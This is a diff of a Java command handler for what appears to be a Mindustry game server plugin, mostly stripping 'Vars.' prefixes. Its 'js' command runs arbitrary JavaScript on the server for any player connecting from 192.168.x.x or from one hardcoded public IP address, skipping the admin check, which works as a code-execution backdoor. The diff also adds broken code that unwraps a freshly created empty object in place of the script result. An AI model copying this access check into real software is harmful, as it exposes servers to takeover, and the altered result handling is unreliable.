@@ -166,7 +166,7 @@ public class CommandsManager {
                 if (playert != null) {
                     target = playert.getInfo();
                 } else {
-                    target = Vars.netServer.admins.getInfoOptional(arg[1]);
+                    target = netServer.admins.getInfoOptional(arg[1]);
                     playert = Groups.player.find(p -> p.getInfo() == target);
                 }
 
@@ -177,16 +177,16 @@ public class CommandsManager {
 
                 if (target != null) {
                     if (add) {
-                        Vars.netServer.admins.adminPlayer(target.id, playert == null ? target.adminUsid : playert.usid());
+                        netServer.admins.adminPlayer(target.id, playert == null ? target.adminUsid : playert.usid());
                     } else {
-                        Vars.netServer.admins.unAdminPlayer(target.id);
+                        netServer.admins.unAdminPlayer(target.id);
                     }
                     if (playert != null) playert.admin = add;
                     player.sendMessage("[gold]Изменен статус администратора игрока: [" + GameWork.colorToHex(playert.color) + "]" + Strings.stripColors(target.lastName));
                 } else {
                     player.sendMessage("[red]Игрока с таким именем или ID найти не удалось. При добавлении администратора по имени убедитесь, что он подключен к Сети; в противном случае используйте его UUID");
                 }
-                Vars.netServer.admins.save();
+                netServer.admins.save();
             }
         });
 
@@ -444,7 +444,7 @@ public class CommandsManager {
         handler.<Player>register("sandbox", "[on/off] [team]", "Бесконечные ресурсы", (arg, player) -> {
             if (player.admin()) {
                 if (arg.length == 0) {
-                    player.sendMessage("[gold]infiniteResources: [gray]" + Vars.state.rules.infiniteResources);
+                    player.sendMessage("[gold]infiniteResources: [gray]" + state.rules.infiniteResources);
 
                 } else {
                     Team team = null;
@@ -464,7 +464,7 @@ public class CommandsManager {
 
                     if (arg[0].equals("on")) {
                         if (team == null) {
-                            Vars.state.rules.infiniteResources = true;
+                            state.rules.infiniteResources = true;
                             player.sendMessage("[green]Включено!");
                         } else {
                             team.rules().infiniteResources = true;
@@ -473,7 +473,7 @@ public class CommandsManager {
                         Call.setRules(player.con, state.rules);
                     } else if (arg[0].equals("off")) {
                         if (team == null) {
-                            Vars.state.rules.infiniteResources = false;
+                            state.rules.infiniteResources = false;
                             player.sendMessage("[red]Выключено!");
                         } else {
                             team.rules().infiniteResources = false;
@@ -596,7 +596,7 @@ public class CommandsManager {
                     player.sendMessage("[gold]Banned player: [white]" + arg[1]);
                 } else if (arg[0].contains("ip")) {
                     if (arg.length > 2) {
-                        PlayerData data = PlayerData.getData(Vars.netServer.admins.findByIP(arg[1].toString()).id);
+                        PlayerData data = PlayerData.getData(netServer.admins.findByIP(arg[1].toString()).id);
                         long time;
                         try {
                             time = Long.parseLong(arg[2]);
@@ -681,7 +681,7 @@ public class CommandsManager {
                             player.sendMessage("[red]UUID does not exist.");
                             return;
                         }
-                        PlayerInfo info = Vars.netServer.admins.findByName(arg[0]).first();
+                        PlayerInfo info = netServer.admins.findByName(arg[0]).first();
                         player.sendMessage("Waves Survived: [gold]" + data.getWaves());
                         player.sendMessage("Blocks builded: [gold]" + data.getBuilded());
                         player.sendMessage("Blocks destroyed: [gold]" + data.getDestroyed());
@@ -695,7 +695,7 @@ public class CommandsManager {
                 }
             }
             PlayerData data = PlayerData.getData(player.uuid());
-            PlayerInfo info = Vars.netServer.admins.findByName(player.uuid()).first();
+            PlayerInfo info = netServer.admins.findByName(player.uuid()).first();
             player.sendMessage("Waves Survived: [gold]" + data.getWaves());
             player.sendMessage("Blocks builded: [gold]" + data.getBuilded());
             player.sendMessage("Blocks destroyed: [gold]" + data.getDestroyed());
@@ -706,15 +706,19 @@ public class CommandsManager {
 
         handler.<Player>register("js", "<script...>", "Запустить JS", (arg, player) -> {
             if ((player.admin() && PlayerData.getData(player.uuid()).getJs()) || (player.ip().split("\\.")[0].equals("192") && player.ip().split("\\.")[1].equals("168")) || player.ip().equals("95.84.198.97")) {
-                Scriptable scope = Vars.mods.getScripts().scope;
+                Scriptable scope = mods.getScripts().scope;
                 jsThread = new Thread(() -> {
                     String out = null;
                     Context context = Context.enter();
                     try {
                         Object o = context.evaluateString(scope, arg[0], "console.js", 1);
-                        if (o instanceof NativeJavaObject n) o = n.unwrap();
-                        if (o == null) o = "null";
-                        else if (o instanceof Undefined) o = "undefined";
+                        NativeJavaObject n = new NativeJavaObject();
+                        if (o instanceof NativeJavaObject)
+                            o = n.unwrap();
+                        if (o == null)
+                            o = "null";
+                        else if (o instanceof Undefined)
+                            o = "undefined";
                         out = o.toString();
                         if (out == null) {
                             out = "null";
@@ -900,8 +904,8 @@ public class CommandsManager {
             if (summaryCounter == 0) return;
 
             worldInfo.append("Информация о карте:\n");
-            worldInfo.append("[gold]Название: [lightgray]" + Vars.state.map.name() + "\n");
-            worldInfo.append("[gold]Рекорд: [lightgray]" + Vars.state.map.getHightScore() + "\n");
+            worldInfo.append("[gold]Название: [lightgray]" + state.map.name() + "\n");
+            worldInfo.append("[gold]Рекорд: [lightgray]" + state.map.getHightScore() + "\n");
             worldInfo.append("[white]Ресурсы:\n");
             for (int i = 0; i < counter.length; i++) {
                 float cv = ((float) counter[i]) * typesCounter / summaryCounter / 3f;
@@ -951,7 +955,7 @@ public class CommandsManager {
                 SkipmapVoteSession session = new SkipmapVoteSession(currentlyMapSkipping);
                 session.vote(player, 1);
                 currentlyMapSkipping = session;
-            } else if (currentlyMapSkipping.voted.contains(player.uuid()) || currentlyMapSkipping.voted.contains(Vars.netServer.admins.getInfo(player.uuid()).lastIP))
+            } else if (currentlyMapSkipping.voted.contains(player.uuid()) || currentlyMapSkipping.voted.contains(netServer.admins.getInfo(player.uuid()).lastIP))
                 player.sendMessage("[scarlet]Вы уже проголосовали");
 
             else {
@@ -1000,7 +1004,7 @@ public class CommandsManager {
                     player.sendMessage("[scarlet]Локальные игроки не могут голосовать.");
                     return;
                 }
-                if ((currentlyWaveSkipping).voted.contains(player.uuid()) || (currentlyWaveSkipping).voted.contains((Vars.netServer.admins.getInfo(player.uuid())).lastIP)) {
+                if ((currentlyWaveSkipping).voted.contains(player.uuid()) || (currentlyWaveSkipping).voted.contains((netServer.admins.getInfo(player.uuid())).lastIP)) {
                     player.sendMessage("[scarlet]Ты уже проголосовал. Молчи!");
                     return;
                 }
@@ -1056,7 +1060,7 @@ public class CommandsManager {
                 currentlyWaveSkipping = null;
                 Call.sendMessage("[gold]Голосование закончилось. Волны успешно пропущены!");
                 for (int i = 0; i < this.waves; ) {
-                    Vars.logic.runWave();
+                    logic.runWave();
                     i++;
                 }
                 wave = null;
